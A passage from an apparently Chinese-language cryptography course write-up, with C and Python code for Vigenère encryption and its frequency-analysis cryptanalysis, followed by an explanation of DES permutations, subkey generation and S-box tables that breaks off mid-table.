class="keyword">if</span>(cyp[i]&gt;=’A’&amp;&amp;cyp[i]&lt;=’Z’)&#123;</span><br><span class="line">              <span class="keyword">if</span>(cyp[i]+(k[j%klen]-‘A’)&gt;’Z’)&#123;</span><br><span class="line">                  cyp[i]=<span class="keyword">char</span>(cyp[i]-(<span class="number">26</span>-(k[j%klen]-‘A’)));</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span>&#123;</span><br><span class="line">                  cyp[i]=<span class="keyword">char</span>(cyp[i]+(k[j%klen]-‘A’));</span><br><span class="line">              &#125;</span><br><span class="line">              j++;</span><br><span class="line">           &#125;</span><br><span class="line">           else if(cyp[i]==’ ‘||cyp[i]==’.’||cyp[i]==’,’||cyp[i]==’'‘)&#123;</span><br><span class="line">              <span class="comment">//cyp[i]=’‘;</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">if</span>(cyp[i]+(k[j%klen]-‘A’)&gt;’z’)&#123;</span><br><span class="line">                  cyp[i]=<span class="keyword">char</span>(cyp[i]-(<span class="number">26</span>-(k[j%klen]-‘A’)));</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span>&#123;</span><br><span class="line">                  cyp[i]=<span class="keyword">char</span>(cyp[i]+(k[j%klen]-‘A’));</span><br><span class="line">              &#125;</span><br><span class="line">              j++;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,cyp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="破解-1"><a href="#破解-1" class="headerlink" title="破解"></a><span style='font-size:14.0pt'>破解</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase <span class="keyword">as</span> lowercase</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要大量的明文支撑</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereDecrypto</span><span class="params">(output, key)</span>:</span></span><br><span class="line">    ptLen = len(output)</span><br><span class="line">    keyLen = len(key)</span><br><span class="line">    quotient = ptLen // keyLen</span><br><span class="line">    remainder = ptLen % keyLen</span><br><span class="line">    inp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, quotient):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, keyLen):</span><br><span class="line">            c = int((ord(output[i * keyLen + j]) - ord(<span class="string">'a'</span>) - (ord(key[j]) - ord(<span class="string">'a'</span>))) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            inp += chr(c)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, remainder):</span><br><span class="line">        c = int((ord(output[quotient * keyLen + i]) - ord(<span class="string">'a'</span>) - (ord(key[i]) - ord(<span class="string">'a'</span>))) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">        <span class="comment"># global input</span></span><br><span class="line">        inp += chr(c)</span><br><span class="line">    <span class="keyword">return</span> inp</span><br><span class="line"><span class="comment">#纯文本</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_trim_text</span><span class="params">(text)</span>:</span></span><br><span class="line">    text = text.lower()</span><br><span class="line">    trim_text = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> lowercase.find(l) &gt;= <span class="number">0</span>:</span><br><span class="line">            trim_text += l</span><br><span class="line">    <span class="keyword">return</span> trim_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算IC</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_coincidence_index</span><span class="params">(text)</span>:</span></span><br><span class="line">    text = get_trim_text(text)</span><br><span class="line">    length = len(text)</span><br><span class="line">    letter_stats = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> lowercase:</span><br><span class="line">        lt = &#123;&#125;</span><br><span class="line">        count = text.count(l)<span class="comment">#统计</span></span><br><span class="line">        lt[l] = count</span><br><span class="line">        letter_stats.append(lt)</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> letter_stats:</span><br><span class="line">        v = list(d.values())[<span class="number">0</span>]</span><br><span class="line">        index += (float(v) / length) ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与0.67比较</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_var</span><span class="params">(data, mean=<span class="number">0.065</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    var_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        var_sum += (d - mean) ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> float(var_sum) / len(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破密钥长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_length</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment"># assume text length less than 26</span></span><br><span class="line">    text = get_trim_text(text)</span><br><span class="line">    group = []</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>, len(text) + <span class="number">1</span>):</span><br><span class="line">        group_str = [<span class="string">''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">            l = text[i]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="keyword">if</span> i % n == j:</span><br><span class="line">                    group_str[j] += l</span><br><span class="line">        group.append(group_str)</span><br><span class="line">    var_list = []</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> tex <span class="keyword">in</span> group:</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> tex:</span><br><span class="line">            index = get_coincidence_index(t)</span><br><span class="line">            data.append(index)</span><br><span class="line">        var_list.append([length, get_var(data)])</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">    var_list = sorted(var_list, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])<span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> [v[<span class="number">0</span>] <span class="keyword">for</span> v <span class="keyword">in</span> var_list[:int(n / <span class="number">2</span>) + <span class="number">1</span>]]  <span class="comment">#</span></span><br><span class="line"><span class="comment"># 统计字频，分组</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countList</span><span class="params">(lis)</span>:</span></span><br><span class="line">    li = []</span><br><span class="line">    alphabet = [chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>, <span class="number">123</span>)]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> lis:</span><br><span class="line">            <span class="keyword">if</span> ch == c:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        li.append(float(count) / len(lis))</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"><span class="comment"># 根据密钥长度分组密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">textToList</span><span class="params">(text, length)</span>:</span></span><br><span class="line">    text = get_trim_text(text)</span><br><span class="line">    textMatrix = []</span><br><span class="line">    row = []</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> text:</span><br><span class="line">        row.append(ch)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index % length == <span class="number">0</span>:</span><br><span class="line">            textMatrix.append(row)</span><br><span class="line">            row = []</span><br><span class="line">    textMatrix.append(row)</span><br><span class="line">    <span class="keyword">return</span> textMatrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">(text, length)</span>:</span></span><br><span class="line">    text = get_trim_text(text)</span><br><span class="line">    key = []  <span class="comment"># 存密钥</span></span><br><span class="line">    alphaRate = [<span class="number">0.08167</span>, <span class="number">0.01492</span>, <span class="number">0.02782</span>, <span class="number">0.04253</span>, <span class="number">0.12705</span>, <span class="number">0.02228</span>, <span class="number">0.02015</span>, <span class="number">0.06094</span>,</span><br><span class="line">                 <span class="number">0.06996</span>, <span class="number">0.00153</span>, <span class="number">0.00772</span>, <span class="number">0.04025</span>, <span class="number">0.02406</span>, <span class="number">0.06749</span>, <span class="number">0.07507</span>, <span class="number">0.01929</span>,</span><br><span class="line">                 <span class="number">0.0009</span>, <span class="number">0.05987</span>, <span class="number">0.06327</span>, <span class="number">0.09056</span>, <span class="number">0.02758</span>, <span class="number">0.00978</span>, <span class="number">0.02360</span>, <span class="number">0.0015</span>, <span class="number">0.01974</span>, <span class="number">0.00074</span>]<span class="comment">#��Ȼ���ɣ�������</span></span><br><span class="line">    matrix = textToList(text, length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        w = [row[i] <span class="keyword">for</span> row <span class="keyword">in</span> matrix <span class="keyword">if</span> len(row) &gt; i]  <span class="comment"># 获取密文</span></span><br><span class="line">        li = countList(w)</span><br><span class="line">        powLi = []  <span class="comment"># 算乘积</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">            Sum = <span class="number">0.0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">                Sum += alphaRate[k] * li[k]</span><br><span class="line">            powLi.append(Sum)</span><br><span class="line">            li = li[<span class="number">1</span>:] + li[:<span class="number">1</span>]  <span class="comment"># 循环移位</span></span><br><span class="line">        Abs = <span class="number">100</span></span><br><span class="line">        ch = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(powLi)):</span><br><span class="line">            <span class="keyword">if</span> abs(powLi[j] - <span class="number">0.065546</span>) &lt; Abs:  <span class="comment"># 找出最接近IC的项</span></span><br><span class="line">                Abs = abs(powLi[j] - <span class="number">0.065546</span>)  <span class="comment"># 保存最接近的距离，作为下次比较的基准</span></span><br><span class="line">                ch = chr(j + <span class="number">97</span>)</span><br><span class="line">        key.append(ch)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line">key_lengths = []</span><br><span class="line">c = input(<span class="string">"输入密文："</span>)</span><br><span class="line">key_lengths = get_key_length(c)</span><br><span class="line">print(key_lengths)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key_lengths)):</span><br><span class="line">    key = getKey(c,key_lengths[i])</span><br><span class="line">    print(<span class="string">"明文%s, 密钥长度是 %d, 密钥是 %s"</span> \</span><br><span class="line">          % (VigenereDecrypto (c , key), key_lengths[i], key))</span><br></pre></td></tr></table></figure>

<h3 id="程序运行截图-1"><a href="#程序运行截图-1" class="headerlink" title="程序运行截图"></a><span style='font-size:14.0pt;font-family:黑体'>程序运行截图</span></h3><p><span lang=EN-US><img src="/2020/02/20/pws/image007.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/20/pws/image008.jpg" class=""></span></p>
<h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a><a name="_Toc534469238"><span style='font-size:16.0pt;font-family:黑体'>分组密码</span></a></h1><h2 id="DES过程分析"><a href="#DES过程分析" class="headerlink" title="DES过程分析"></a><span style='font-size:14.0pt;font-family:黑体'>DES过程分析</span></h2><h3 id="所需参数"><a href="#所需参数" class="headerlink" title="所需参数"></a><span style='font-size:14.0pt;font-family:黑体'>所需参数</span></h3><p><span lang=EN-US>key:8</span><span>个字节共<span lang=EN-US>64</span>位密钥</span></p>
<p><span lang=EN-US>data</span><span>：<span lang=EN-US>8</span>个字节共<span lang=EN-US>64</span>位需要被加密的明文</span></p>
<h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a><span style='font-size:14.0pt;font-family:黑体'>初始置换</span></h3><p><span lang=EN-US>DES</span><span>算法使用<span lang=EN-US>64</span>位的密钥<span lang=EN-US>key</span>将<span lang=EN-US>64</span>位的明文输入块变为<span lang=EN-US>64</span>位的密文输出块，并把输出块分为<span
lang=EN-US>L0</span>、<span lang=EN-US>R0</span>两部分，每部分均为<span lang=EN-US>32</span>位。初始置换规则如下：</span></p>
<div style='border:none;border-left:solid #6CE26C 2.25pt;padding:0cm 0cm 0cm 0cm;
background:white;margin-left:18.0pt;margin-right:0cm'>

<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>58,50,42,34,26,18,10,2,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>60,52,44,36,28,20,12,4,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>62,54,46,38,30,22,14,6,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>64,56,48,40,32,24,16,8,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>5.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>57,49,41,33,25,17,&nbsp;9,1,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>59,51,43,35,27,19,11,3,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>7.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>61,53,45,37,29,21,13,5,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>8.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>63,55,47,39,31,23,15,7,&nbsp;&nbsp;</span></p>
</div>

<h3 id="加密-迭代处理函数（F函数）"><a href="#加密-迭代处理函数（F函数）" class="headerlink" title="加密-迭代处理函数（F函数）"></a><span style='font-size:14.0pt;font-family:黑体'>加密-迭代处理函数（F函数）</span></h3><p><span>经过初始置换之后，进行<span lang=EN-US>16</span>轮完全相同的运算，在运算过程中数据与密钥结合。</span></p>
<p><span>函数<span lang=EN-US>F</span>的输出经过一个异或运算，和左半部分结合形成新的右半部分，原来的右半部分成为新的左半部分。</span></p>
<p><span lang=EN-US>F</span><span>函数：</span><span>是由四步运算构成：密钥置换；拓展置换；<span lang=EN-US>S</span>盒代替；<span lang=EN-US>P</span>置换；</span></p>
<p><span>密钥置换—子密钥生成：</span><span lang=EN-US>DES</span><span>算法由<span lang=EN-US>64</span>位密钥产生<span lang=EN-US>16</span>轮的<span lang=EN-US>48</span>位子密钥。在每一轮的迭代过程中，使用不同的子密钥。</span></p>
<p><span lang=EN-US>1. </span><span>把密钥的奇偶校验位忽略不参与计算，即每个字符的第<span lang=EN-US>8</span>位，将<span lang=EN-US>6</span>位密钥降为<span lang=EN-US>56</span>位，让后根据选择置换<span lang=EN-US>PC-1</span>将<span lang=EN-US>56</span>位分成<span lang=EN-US>2</span>块<span lang=EN-US>C0</span>和<span lang=EN-US>D0</span>各<span lang=EN-US>28</span>位。</span></p>
<p><span lang=EN-US>2. </span><span>将<span lang=EN-US>C0</span>和<span lang=EN-US>D0</span>进行循环左移变化（美伦循环作业的位数由轮数决定），变换后产生<span lang=EN-US>C1</span>和<span lang=EN-US>D1</span>，然后<span lang=EN-US>C1</span>和<span lang=EN-US>D1</span>合并，并通过选择置换<span lang=EN-US>pc-2</span>生成子密钥<span lang=EN-US>k1</span>（<span lang=EN-US>48</span>位）</span></p>
<p><span lang=EN-US>3. C1</span><span>和<span lang=EN-US>D1</span>再次经过循环左移变换，生成<span lang=EN-US>C2</span>和<span lang=EN-US>D2</span>，然后合并<span lang=EN-US>C2</span>，<span lang=EN-US>D2</span>，通过选择置换<span lang=EN-US>pc</span>—<span lang=EN-US>2</span>生成密钥<span lang=EN-US>K2</span>（<span lang=EN-US>48</span>位）</span></p>
<p><span lang=EN-US>4. </span><span>以此类推，得到<span lang=EN-US>K16</span>。最后一轮的左右两部分不交换，而是直接合并在一起<span lang=EN-US>R16L16</span>，作为逆置换的输入块。</span></p>
<p><span>密钥置换选择<span lang=EN-US>1 &nbsp;PC</span>—<span lang=EN-US>1</span></span></p>
<p><span lang=EN-US>64</span><span>位秘钥降至<span lang=EN-US>56</span>位秘钥不是说将每个字节的第八位删除，而是通过缩小选择换位表<span lang=EN-US>1</span>（置换选择表<span lang=EN-US>1</span>）的变换变成<span lang=EN-US>56</span>位。</span></p>
<div style='border:none;border-left:solid #6CE26C 2.25pt;padding:0cm 0cm 0cm 0cm;
background:white;margin-left:18.0pt;margin-right:0cm'>

<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>57,49,41,33,25,17,9,1,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>58,50,42,34,26,18,10,2,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>59,51,43,35,27,19,11,3,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>60,52,44,36,63,55,47,39,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>5.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>31,23,15,7,62,54,46,38,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>30,22,14,6,61,53,45,37,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>7.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>29,21,13,5,28,20,12,4&nbsp;&nbsp;</span></p>
</div>

<img src="/2020/02/20/pws/image009.jpg" class=""><span lang=EN-US>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<p></span><span>再将<span lang=EN-US>56</span>位秘钥分成<span lang=EN-US>C0</span>和<span lang=EN-US>D0,</span></span><span lang=EN-US> </span><span>根据轮数，将<span lang=EN-US>Cn</span>和<span lang=EN-US>Dn</span>分别循环左移<span lang=EN-US>1</span>位或<span lang=EN-US>2</span>位<span lang=EN-US>.</span></span></p>
<p><span>扩展置换<span lang=EN-US>E(E</span>位选择表<span lang=EN-US>)</span></span></p>
<p><span>通过扩展置换<span lang=EN-US>E</span>，数据的右半部分<span lang=EN-US>Rn</span>从<span lang=EN-US>32</span>位扩展到<span lang=EN-US>48</span>位。扩展置换改变了位的次序，重复了某些位。扩展置换的目的：<span lang=EN-US>a</span>、产生与秘钥相同长度的数据以进行异或运算，<span lang=EN-US>R0</span>是<span lang=EN-US>32</span>位，子秘钥是<span lang=EN-US>48</span>位，所以<span lang=EN-US>R0</span>要先进行扩展置换之后与子秘钥进行异或运算；<span
lang=EN-US>b</span>、提供更长的结果，使得在替代运算时能够进行压缩。扩展置换<span lang=EN-US>E</span>规则如下：</span></p>
<p><span
lang=EN-US><img src="/2020/02/20/pws/image010.jpg" class=""></span></p>
<p><span>S-盒代替<span lang=EN-US>(</span>功能表<span lang=EN-US>S</span>盒<span lang=EN-US>)</span></span></p>
<p><span lang=EN-US>Rn</span><span>扩展置换之后与子秘钥<span lang=EN-US>Kn</span>异或以后的结果作为输入块进行<span
lang=EN-US>S</span>盒代替运算功能是把<span lang=EN-US>48</span>位数据变为<span lang=EN-US>32</span>位数据代替运算由<span
lang=EN-US>8</span>个不同的代替盒<span lang=EN-US>(S</span>盒<span lang=EN-US>)</span>完成。每个<span
lang=EN-US>S-</span>盒有<span lang=EN-US>6</span>位输入，<span lang=EN-US>4</span>位输出。所以<span
lang=EN-US>48</span>位的输入块被分成<span lang=EN-US>8</span>个<span lang=EN-US>6</span>位的分组，每一个分组对应一个<span
lang=EN-US>S-</span>盒代替操作。经过<span lang=EN-US>S-</span>盒代替，形成<span lang=EN-US>8</span>个<span
lang=EN-US>4</span>位分组结果。注意：每一个<span lang=EN-US>S-</span>盒的输入数据是<span
lang=EN-US>6</span>位，输出数据是<span lang=EN-US>4</span>位，但是每个<span lang=EN-US>S-</span>盒自身是<span
lang=EN-US>64</span>位！！每个<span lang=EN-US>S-</span>和是<span lang=EN-US>4</span>行<span
lang=EN-US>16</span>列的格式，因为二进制<span lang=EN-US>4</span>位是<span lang=EN-US>0~15</span>。<br><span lang=EN-US>8</span>个<span lang=EN-US>S-</span>盒的值如下：</span></p>
<div style='border:none;border-left:solid #6CE26C 2.25pt;padding:0cm 0cm 0cm 0cm;
background:white;margin-left:18.0pt;margin-right:0cm'>

<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:#008200'>&nbsp;&nbsp;&nbsp;//&nbsp;S1</span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;14,&nbsp;4,&nbsp;&nbsp;13,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1,&nbsp;&nbsp;2,&nbsp;15,&nbsp;11,&nbsp;&nbsp;8,&nbsp;&nbsp;3,&nbsp;10,&nbsp;&nbsp;6,&nbsp;12,&nbsp;&nbsp;5,&nbsp;&nbsp;9,&nbsp;&nbsp;0,&nbsp;&nbsp;7,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>3.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;0,&nbsp;15,&nbsp;&nbsp;7,&nbsp;&nbsp;4,&nbsp;14,&nbsp;&nbsp;2,&nbsp;13,&nbsp;&nbsp;1,&nbsp;10,&nbsp;&nbsp;6,&nbsp;12,&nbsp;11,&nbsp;&nbsp;9,&nbsp;&nbsp;5,&nbsp;&nbsp;3,&nbsp;&nbsp;8,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;4,&nbsp;&nbsp;1,&nbsp;14,&nbsp;&nbsp;8,&nbsp;13,&nbsp;&nbsp;6,&nbsp;&nbsp;2,&nbsp;11,&nbsp;15,&nbsp;12,&nbsp;&nbsp;9,&nbsp;&nbsp;7,&nbsp;&nbsp;3,&nbsp;10,&nbsp;&nbsp;5,&nbsp;&nbsp;0,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;color:#5C5C5C'>5.<span
style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span lang=EN-US
style='font-size:12.0pt;font-family:Consolas;color:black'>&nbsp;&nbsp;&nbsp;15,&nbsp;12,&nbsp;&nbsp;8,&nbsp;&nbsp;2,&nbsp;&nbsp;4,&nbsp;&nbsp;9,&nbsp;&nbsp;1,&nbsp;&nbsp;7,&nbsp;&nbsp;5,&nbsp;11,&nbsp;&nbsp;3,&nbsp;14,&nbsp;10,&nbsp;&nbsp;0,&nbsp;&nbsp;6,&nbsp;13,&nbsp;&nbsp;</span></p>
<p><span lang=EN-US style='font-size:12.0pt;font-family:Consolas;
color:#5C5C5C'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><span
